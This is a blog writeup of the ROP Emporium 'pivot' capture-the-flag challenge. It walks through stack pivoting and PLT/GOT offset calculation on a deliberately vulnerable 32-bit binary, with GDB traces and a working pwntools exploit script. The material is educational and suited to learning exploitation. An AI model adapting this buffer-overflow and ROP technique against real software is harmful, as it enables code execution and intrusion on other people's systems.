---
title: "ROP Emporium - Pivot Writeup"
date: 2020-04-05T22:00:35+05:30
draft: false
toc: false
images:
tags:
  - ctf
  - rop
  - pivot
---

I recently came across the [ropemporium](https://ropemporium.com/) challenges while looking for resources to learn [Return Oriented Programming (ROP)](https://en.wikipedia.org/wiki/Return-oriented_programming). I think that the challenges are very good and the difficulty increases with the problems which keep things interesting. The challenge this writeup is about is the [pivot](https://ropemporium.com/challenge/pivot.html) challenge. I will be using the 32 bit binary for the explanation purpose but the solution is pretty much the same for the 64-bit version.

The problem description gives a basic idea of what needs to be done

> There's only enough space for a three-link chain on the stack but you've been given space to stash a much larger ROP chain elsewhere. Learn how to pivot the stack onto a new location.

## Exploring the binary

I started by executing the binary and it expects two different inputs from the user. The print statements of binary make it clear that the second input should be used to overflow the stack and pivot it and the first input is for the main ROP chain.

```bash
pivot by ROP Emporium
32bits

Call ret2win() from libpivot.so
The Old Gods kindly bestow upon you a place to pivot: 0xf7cfef10
Send your second chain now and it will land there
> hello
Now kindly send your stack smash
> world

Exiting
```

The address printed by the binary is most probably the address where the longer chain is stored (heap). We can confirm this by debugging the binary with GDB.

Before getting into debugging the binary, I would like to state some things that I assume readers already know (if they have solved any of the previous challenges). Every binary has a `pwnme` function which uses the vulnerable `gets()` function which is used to overwrite the return pointer. The return pointer can be overwritten by 44 bytes of padding. And each binary has a function named either uselessFunction or usefulFunction which has useful assembly. This binary has a `uselessFunction()` which calls the `foothold_function`which is very important for this challenge but more on it later.

Now getting back to the address received from the binary. We open the binary with GDB and disassemble the `pwnme` function and set a breakpoint after the first `fgets` call (at pwnme + 114). Run the program and enter a string like `AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA`.
GDB breaks and the address is printed by the binary (`0xf7dc8f10` in this case). On examining this address, we find the value `0x414141` multiple times which is ASCII value of 'A' in hexadecimal.

```bash
pwndbg> x/20wx 0xf7dc8f10
0xf7dc8f10: 0x41414141 0x41414141 0x41414141 0x41414141
0xf7dc8f20: 0x41414141 0x41414141 0x41414141 0x41414141
0xf7dc8f30: 0x41414141 0x41414141 0x41414141 0x41414141
0xf7dc8f40: 0x41414141 0x41414141 0x41414141 0x41414141
0xf7dc8f50: 0x0000000a 0x00000000 0x00000000 0x00000000
```

This confirms that the address received from binary is where the longer chain will be stored.

## Pivot the stack

The next step is to build the shorter ROP chain which pivots the stack but what does pivoting the stack mean?
In simple terms, pivoting the stack means to make the stack pointer (`ESP`) point to a memory location which we control instead of the actual stack. So, all we need to do is make `ESP` point to the address where are longer ROP chain will be saved.

For this, we need gadgets that can load the value from stack into any of the registers and then move the value of that register in `ESP`. The gadgets available inside a binary can be found using [ROPGadget](https://github.com/JonathanSalwan/ROPgadget). On running the script on our `pivot32` binary, it found 160 unique gadgets. One of them is the `xchg eax, esp ; ret` gadget which exchanges the value of `EAX` and `ESP`. It seems like this gadget was placed intentionally in the binary and that it is the case. The binary contains a function `usefulGadgets` which contains some useful gadgets.

```bash
pwndbg> disass usefulGadgets
Dump of assembler code for function usefulGadgets:
   0x080488c0 <+0>:  pop    eax
   0x080488c1 <+1>:  ret
   0x080488c2 <+2>:  xchg   esp,eax
   0x080488c3 <+3>:  ret
   0x080488c4 <+4>:  mov    eax,DWORD PTR [eax]
   0x080488c6 <+6>:  ret
   0x080488c7 <+7>:  add    eax,ebx
   0x080488c9 <+9>:  ret
   0x080488ca <+10>: xchg   ax,ax
   0x080488cc <+12>: xchg   ax,ax
   0x080488ce <+14>: xchg   ax,ax
End of assembler dump.
```

Other gadget used for the pivoting is `pop eax ; ret`. This pops a value from the stack and moves it into `EAX` register. So let's start building the exploit script using `pwntools`. Here is a snippet of the script which loads the binary and extracts the address from the output. Some basic regex is used to extract the address.

```python
from pwn import *
import re

e = ELF('./pivot32')
p = e.process()

recvd = p.recv().decode()

# address where longer chain is written
addr = re.findall('0x[0-9a-f]{8}', recvd)[0]
addr = int(addr, 16)
addr = p32(addr)

# padding for buffer overflow
padding = b'A' * 44

# gadgets
# pop eax ; ret
pop_eax = p32(0x080488c0)

# xchg eax, esp ; ret
xchg = p32(0x080488c2)
```

The short ROP chain is built such that after returning from `pwnme`, the `pop_eax` gadget is executed and then the exchange gadget is called.

```python
# short chain for overflowing stack and pivoting stack to longer chain
short = padding
short += pop_eax
short += addr
short += xchg
```

When `pop_eax` is executed, the top of the stack is the address where longer chain is saved, therefore it pops that value into the `EAX` register. Now `EAX` contains the address of long chain. The `xchg` gadget swaps the values and now `ESP` contains the required address. The longer chain is currently set to some junk value like `0xdeadbeef`. We can check this script by running this script and attaching GDB.

Breaking at `ret` of `pwnme` shows the path we are going to follow -

```bash
 ► 0x804889f <pwnme+173>           leave
   0x80488a0 <pwnme+174>           ret
    ↓
   0x80488c0 <usefulGadgets>       pop    eax
   0x80488c1 <usefulGadgets+1>     ret

   0x80488c2 <usefulGadgets+2>     xchg   eax, esp
   0x80488c3 <usefulGadgets+3>     ret
```

And after the exchange gadget is executed, `ESP` points to the address where longer chain is saved and the program tries executing the instructions saved at that address. GDB gets a segmentation fault since the address contains`0xdeadbeef` at this stage.

```bash
   0x804889f <pwnme+173>          leave
   0x80488a0 <pwnme+174>          ret
    ↓
   0x80488c0 <usefulGadgets>      pop    eax
   0x80488c1 <usefulGadgets+1>    ret

   0x80488c2 <usefulGadgets+2>    xchg   eax, esp
 ► 0x80488c3 <usefulGadgets+3>    ret    <0xdeadbeef>
```

The updated registers are listed and it can be seen that `ESP` points to the desired address.

```bash
 EAX  0xfff4de88 ◂— 0xa /* '\n' */
 EBX  0x0
 ECX  0xfff4de50 ◂— 0x41414141 ('AAAA')
 EDX  0xf7fa189c (_IO_stdfile_0_lock) ◂— 0x0
 EDI  0x0
 ESI  0xf7fa0000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1d7d6c
 EBP  0x41414141 ('AAAA')
 ESP  0xf7dc6f10 ◂— 0xdeadbeef
 EIP  0x80488c3 (usefulGadgets+3) ◂— ret
```

We have successfully pivoted the stack to the desired address and now the longer ROP chain has to be built to get the flag.

## Getting the flag

### PLT and GOT

On reading the rest of the problem description, it is understood that we need to call the `ret2win` function dynamically imported from `libpivot32.so`. But instead of `ret2win`, another function from the same library, `foothold_function` is imported and used in the binary. The rest of the challenge requires the knowledge of PLT and GOT and their working. You can read about them in Appendix A of ropemporium's [beginner's guide](https://ropemporium.com/guide.html). I would also suggest [this](https://www.youtube.com/watch?v=kUk5pw4w0h4) video since it explains the working with a working example.

The `foothold_function` has an entry in the GOT but it needs to be populated. So, the function has to be called. We also have to find the offset between the `foothold_function` and the `ret2win` function in `libpivot32.so`. Once, the GOT entry is populated, the address of the desired function can be calculated by adding the offset to the address of `foothold_function` and calling it.

### Finding the offset

I used `objdump` command to dump the source assembly of `libpivot32.so` and `grep` to find their offsets from the start of the binary.

```bash
$ objdump -S libpivot32.so | grep foothold_function
00000770 <foothold_function>:

$ objdump -S libpivot32.so | grep ret2win
00000967 <ret2win>:
```

Subtracting the two values gives the offset as `0x1f7`

### Finding appropriate gadgets

To add offsets into registers and load data from memory, we need gadgets. Here are the gadgets used -

1. `pop ebx ; ret` - This is used to load a value from the top of the stack to `EBX`.

2. `add eax, ebx ; ret` - This will add the value of `EBX` and `EAX` and store it in `EAX`

3. `mov eax, dword ptr [eax] ; ret` - This loads the value stored at the value in `EAX`. In simple terms, it uses the value in `EAX` as an address and the value at that address is moved into `EAX`

4. `call eax` - This will call the address in `EAX` (should be the address of a function)

### Building the ROP chain

Before building the ROP chain, the PLT and GOT entries of `foothold_function`, the various gadgets found and the offset are stored in variables.

```python
# dynamically imported function - foothold_function
foothold_plt = p32(0x80485f0)
foothold_got = p32(0x804a024)

# gadgets
# pop eax ; ret
pop_eax = p32(0x080488c0)

# call eax
call_eax = p32(0x080486a3)

# mov eax, dword ptr [eax] ; ret
eax_val = p32(0x080488c4)

# xchg eax, esp ; ret
xchg = p32(0x080488c2)

# pop ebx ; ret
pop_ebx = p32(0x08048571)

# add eax, ebx ; ret
add = p32(0x080488c7)

offset = p32(0x1f7)
```

The longer ROP chain is initialised with the PLT value of `foothold_function` since the first thing we need is to call this function to populate the GOT entry.

```python
long = foothold_plt
```

After this, the GOT entry contains the address of `foothold_function` in the memory. The `libpivot32.so` is brought into memory when required and assigned a starting memory address. First, the address of GOT entry is moved in `EAX` and then using the `mov eax, dword ptr [eax] ; ret` gadget, the address of the imported function is moved to `EAX`(saved at the GOT entry).

```python
long += pop_eax
long += foothold_got
long += eax_val
```

The offset is moved to `EBX` and then added to `EAX`

```python
long += pop_ebx
long += offset
long += add
```

Now `EAX` contains the address of `ret2win` function and it can be called.

```python
long += call_eax
```

This solves the challenge and the flag is obtained. The complete [script](https://github.com/saurabhmittal16/ropemporium/blob/master/pivot32.py) can be found in my Github [repo](https://github.com/saurabhmittal16/ropemporium).

Here is the output when the script is executed

```bash
$ python3 exploit.py
[*] '/home/saurabh/Data/Exploit/ropemporium/pivot/32/pivot32'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
    RPATH:    b'./'
[+] Starting local process '/home/saurabh/Data/Exploit/ropemporium/pivot/32/pivot32': pid 28882
Now kindly send your stack smash
>
foothold_function(), check out my .got.plt entry to gain a foothold into libpivot.so
[+] ROPE{a_placeholder_32byte_flag!}
```

That's the end of this post. I think that this is a great challenge for beginners since the challenge is not too difficult but still interesting to work on. Thanks for reading. Cheers!
